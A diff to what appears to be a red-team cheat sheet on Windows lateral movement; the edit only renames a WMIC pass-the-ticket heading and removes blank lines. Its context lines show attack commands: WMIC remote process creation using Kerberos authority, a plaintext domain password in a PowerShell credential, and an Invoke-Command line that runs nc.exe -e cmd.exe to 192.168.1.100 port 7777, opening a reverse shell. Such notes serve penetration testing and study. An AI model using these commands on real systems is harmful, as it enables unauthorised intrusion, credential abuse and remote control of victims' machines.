@@ -39,7 +39,7 @@ WMIGrunt wkstn-4945 PowerShell cyberbotic.io\n.lamb F3rrari
 WMIGrunt wkstn-4945 PowerShell
 
 ```
-### Pass the Ticket with WMIC
+### Pass the Ticket with Windows Management Instrumentation
 ```
 wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
 wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local path win32_process call create calc.exe
@@ -63,9 +63,6 @@ PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New
 Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}
 Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
 ```
-
-
-
 
 
 ### Evil-WinRM
